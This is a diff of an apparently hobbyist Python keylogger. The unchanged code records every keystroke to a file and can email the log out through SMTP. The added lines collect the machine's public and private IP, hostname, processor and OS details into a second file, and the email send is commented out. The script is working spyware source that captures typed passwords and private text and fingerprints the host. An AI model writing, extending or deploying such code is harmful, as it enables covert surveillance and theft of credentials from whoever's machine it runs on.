@@ -1,4 +1,4 @@
- # Libraries
+# Libraries
 
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
@@ -33,13 +33,14 @@ load_dotenv()
 email_address = os.getenv('FROM_EMAIL_USER')
 password = os.getenv('EMAIL_PASSWORD')
 toaddr = os.getenv('TO_EMAIL_USER')
-
 key_information = "key_log.txt"
+system_information = "systeminfo.txt"
 file_path = "/Users/rachittanwar/Documents/[02]/Coding/Cybersecurity/Python Keylogger/project"
 extend = "/"
 
 count = 0
 keys = []
+
 
 # email controls
 def send_email(filename, attachment, toaddr):
@@ -64,6 +65,26 @@ def send_email(filename, attachment, toaddr):
     s.sendmail(fromaddr, toaddr, text)
     s.quit()
 
+
+# get the computer information
+def computer_information():
+    with open(file_path + extend + system_information, "a") as f:
+        hostname = socket.gethostname()
+        IPAddr = socket.gethostbyname(hostname)
+        try:
+            public_ip = get("https://api.ipify.org").text
+            f.write("Public IP Address: " + public_ip)
+
+        except Exception:
+            f.write("Couldn't get Public IP Address (most likely max query")
+
+        f.write("\nProcessor: " + (platform.processor()) + '\n')
+        f.write("System: " + platform.system() + " " + platform.version() + '\n')
+        f.write("Machine: " + platform.machine() + "\n")
+        f.write("Hostname: " + hostname + "\n")
+        f.write("Private IP Address: " + IPAddr + "\n")
+
+
 def on_press(key):
     global keys, count
 
@@ -76,6 +97,7 @@ def on_press(key):
         write_file(keys)
         keys = []
 
+
 def write_file(keys):
     with open(file_path + extend + key_information, "a") as f:
         for key in keys:
@@ -87,11 +109,14 @@ def write_file(keys):
                 f.write(k)
                 f.close()
 
+
 def on_release(key):
     if key == Key.esc:
         return False
-    
+
+
 with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
 
-send_email(key_information, file_path + extend + key_information, toaddr)
+# send_email(key_information, file_path + extend + key_information, toaddr)
+computer_information()
